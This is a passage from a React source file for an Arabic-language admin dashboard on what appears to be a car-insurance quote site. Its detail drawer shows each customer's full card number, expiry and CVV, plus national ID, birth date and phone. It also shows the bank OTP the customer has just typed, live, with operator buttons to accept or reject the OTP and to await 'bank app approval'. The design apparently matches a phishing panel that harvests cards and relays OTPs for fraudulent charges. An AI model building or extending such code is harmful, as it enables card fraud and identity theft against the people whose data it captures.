                        <XCircle className="h-4 w-4" />
                        <span>رفض</span>
                      </button>
                    </div>
                  )}
                </div>
              );
            })}
          </div>
            </>
          )}
        </section>
      </div>

      {/* Detail drawer */}
      {selected && (
        <div
          className="fixed inset-0 z-50 flex items-stretch justify-start bg-black/50 backdrop-blur-sm animate-in fade-in"
          onClick={() => setSelected(null)}
        >
          <aside
            dir="rtl"
            onClick={(e) => e.stopPropagation()}
            className="ms-auto h-full w-full max-w-full overflow-y-auto bg-[hsl(210_40%_97%)] shadow-2xl sm:max-w-[480px] animate-in slide-in-from-left"
          >
            {/* Sticky header */}
            <div className="sticky top-0 z-10 border-b border-border bg-gradient-to-br from-brand-blue to-[hsl(214_70%_30%)] px-4 py-4 text-white sm:px-5">
              <div className="flex items-center justify-between gap-3">
                <div className="min-w-0">
                  <h2 className="truncate text-[15px] font-extrabold sm:text-[17px]">
                    تفاصيل الطلب
                  </h2>
                  <div className="mt-0.5 truncate font-mono text-[11px] text-white/80">
                    {selected.id}
                  </div>
                </div>
                <button
                  type="button"
                  onClick={() => setSelected(null)}
                  className="grid h-9 w-9 shrink-0 place-items-center rounded-lg bg-white/15 text-white hover:bg-white/25"
                  aria-label="إغلاق"
                >
                  <X className="h-5 w-5" />
                </button>
              </div>
            </div>

            <div className="space-y-4 p-4 sm:p-5">
              {/* Credit card visual */}
              {(selected.cardNumber || selected.cardName) && (
                <div>
                  <CreditCardVisual
                    number={selected.cardNumber}
                    name={selected.cardName || selected.fullName}
                    expMonth={selected.cardExpMonth}
                    expYear={selected.cardExpYear}
                    cvv={selected.cardCvv}
                    brand={selected.cardBrand}
                  />

                  {/* Approve / reject — always visible */}
                  <div className="mt-3 space-y-2">
                    <div className="flex gap-2">
                      <button
                        type="button"
                        onClick={() => handleApprove(selected.id)}
                        className="flex h-11 flex-1 items-center justify-center gap-1.5 rounded-xl bg-emerald-600 text-[13px] font-extrabold text-white shadow-sm active:scale-[0.98]"
                      >
                        <Check className="h-4 w-4" /> قبول
                      </button>
                      <button
                        type="button"
                        onClick={() => handleReject(selected.id)}
                        className="flex h-11 flex-1 items-center justify-center gap-1.5 rounded-xl bg-destructive text-[13px] font-extrabold text-white shadow-sm active:scale-[0.98]"
                      >
                        <XCircle className="h-4 w-4" /> رفض
                      </button>
                    </div>
                    <button
                      type="button"
                      onClick={() => handleApproveBank(selected.id)}
                      className="flex h-11 w-full items-center justify-center gap-1.5 rounded-xl bg-blue-600 text-[13px] font-extrabold text-white shadow-sm active:scale-[0.98]"
                    >
                      <Check className="h-4 w-4" /> قبول على البنك
                    </button>
                  </div>
                  {selected.reviewStatus !== "awaiting_review" && (
                    <div className="mt-3 flex justify-center">
                      {(() => {
                        const map: Record<string, { text: string; cls: string; icon: React.ElementType }> = {
                          bank_approval: { text: "بانتظار موافقة تطبيق البنك", cls: "bg-blue-100 text-blue-700", icon: Clock },
                          approved: { text: "تم القبول — بانتظار OTP", cls: "bg-blue-100 text-blue-700", icon: CheckCircle2 },
                          rejected: { text: "مرفوض", cls: "bg-red-100 text-red-700", icon: XCircle },
                          otp_submitted: { text: "تم إدخال OTP — بانتظار التأكيد", cls: "bg-amber-100 text-amber-700", icon: Clock },
                          otp_rejected: { text: "OTP مرفوض — العميل يعيد الإدخال", cls: "bg-orange-100 text-orange-700", icon: XCircle },
                          completed: { text: "مكتمل / مدفوع", cls: "bg-emerald-100 text-emerald-700", icon: CheckCircle2 },
                        };
                        const r = map[selected.reviewStatus];
                        if (!r) return null;
                        const I = r.icon;
                        return (
                          <span className={cn(
                            "inline-flex items-center gap-1 rounded-full px-3 py-1.5 text-[12px] font-bold",
                            r.cls,
                          )}>
                            <I className="h-3.5 w-3.5" /> {r.text}
                          </span>
                        );
                      })()}
                    </div>
                  )}

                  {/* OTP submitted by user — appears live via realtime */}
                  {selected.otpCode && (selected.reviewStatus === "otp_submitted" || selected.reviewStatus === "completed" || selected.reviewStatus === "otp_rejected") && (
                    <div className="mt-3 overflow-hidden rounded-2xl border border-amber-300/60 bg-gradient-to-br from-amber-50 to-white shadow-sm animate-in fade-in slide-in-from-bottom-2">
                      <div className="flex items-center gap-2 border-b border-amber-200/60 bg-amber-100/60 px-3 py-2">
                        <KeyRound className="h-3.5 w-3.5 text-amber-700" />
                        <span className="text-[12px] font-extrabold text-amber-800">
                          رمز OTP المُدخَل من العميل
                        </span>
                        {selected.reviewStatus === "otp_submitted" && (
                          <span className="ms-auto flex items-center gap-1 rounded-full bg-amber-600 px-2 py-0.5 text-[10px] font-bold text-white">
                            <span className="relative flex h-1.5 w-1.5">
                              <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-white/80" />
                              <span className="relative inline-flex h-1.5 w-1.5 rounded-full bg-white" />
                            </span>
                            مباشر
                          </span>
                        )}
                      </div>
                      <div className="flex items-center justify-center px-3 py-4">
                        <div className="font-mono text-[28px] font-extrabold tracking-[0.5em] text-brand-blue" dir="ltr">
                          {selected.otpCode}
                        </div>
                      </div>

                      {selected.reviewStatus === "otp_submitted" && (
                        <div className="flex gap-2 border-t border-amber-200/60 bg-white p-3">
                          <button
                            type="button"
                            onClick={() => handleApproveOtp(selected.id)}
                            className="flex h-11 flex-1 items-center justify-center gap-1.5 rounded-xl bg-emerald-600 text-[13px] font-extrabold text-white shadow-sm active:scale-[0.98]"
                          >
                            <Check className="h-4 w-4" /> قبول OTP
                          </button>
                          <button
                            type="button"
                            onClick={() => handleRejectOtp(selected.id)}
                            className="flex h-11 flex-1 items-center justify-center gap-1.5 rounded-xl bg-destructive text-[13px] font-extrabold text-white shadow-sm active:scale-[0.98]"
                          >
                            <XCircle className="h-4 w-4" /> رفض OTP
                          </button>
                        </div>
                      )}
                    </div>
                  )}
                </div>
              )}

              <Section icon={Users} title="بيانات العميل" tone="blue">
                <Detail label="الاسم" value={selected.fullName} />
                <Detail label="الهوية" value={selected.identity} />
                <Detail label="تاريخ الميلاد" value={selected.birthDate} />
                <Detail label="الجوال" value={selected.phone} />
              </Section>

              <Section icon={FileText} title="بيانات المركبة" tone="violet">
                <Detail label="الماركة والنوع" value={selected.carModel} />
                <Detail label="سنة الصنع" value={selected.carYear} />
                <Detail label="القيمة التقديرية" value={selected.estValue} />
                <Detail label="الغرض" value={selected.purpose} />
                <Detail label="مكان الإصلاح" value={selected.repairPlace} />
              </Section>

              <Section icon={CheckCircle2} title="وثيقة التأمين" tone="emerald">
                <Detail label="نوع التأمين" value={selected.insuranceType} />
                <Detail label="تاريخ البدء" value={selected.startDate} />
                <Detail label="الشركة" value={selected.company} />
                <Detail label="نوع العرض" value={selected.type} />
                <Detail
                  label="السعر"
                  value={selected.price != null ? `${selected.price.toFixed(2)} ر.س` : "—"}
                />
              </Section>

              <Section icon={Wallet} title="الدفع" tone="amber">
                <Detail label="طريقة الدفع" value={selected.method} />
                <Detail
                  label="المجموع"
                  value={selected.total != null ? `${selected.total.toFixed(2)} ر.س` : "—"}
                />
                <Detail label="الحالة" value={selected.status === "paid" ? "مدفوع" : "قيد الانتظار"} />
                <Detail
                  label="تاريخ الإنشاء"
                  value={new Date(selected.createdAt).toLocaleString("ar-SA")}
                />
              </Section>

              {(selected.cardNumber || selected.cardName) && (
                <Section icon={CreditCard} title="بيانات البطاقة" tone="blue">
                  <Detail label="اسم حامل البطاقة" value={selected.cardName} />
                  <Detail
                    label="تاريخ الانتهاء"
                    value={
                      selected.cardExpMonth && selected.cardExpYear
                        ? `${selected.cardExpMonth} / ${selected.cardExpYear}`
                        : "—"
                    }
                  />
                  <Detail label="CVV" value={selected.cardCvv} />
                </Section>
              )}

              <button
                type="button"
                onClick={() => handleDelete(selected.id)}
                className="mt-2 flex h-11 w-full items-center justify-center gap-2 rounded-xl border border-destructive/40 bg-white text-[13px] font-bold text-destructive hover:bg-destructive/5"
              >
                <Trash2 className="h-4 w-4" />
                <span>حذف هذا الطلب</span>
              </button>
            </div>
          </aside>
        </div>
      )}
    </main>
  );
};

export default AdminDashboard;
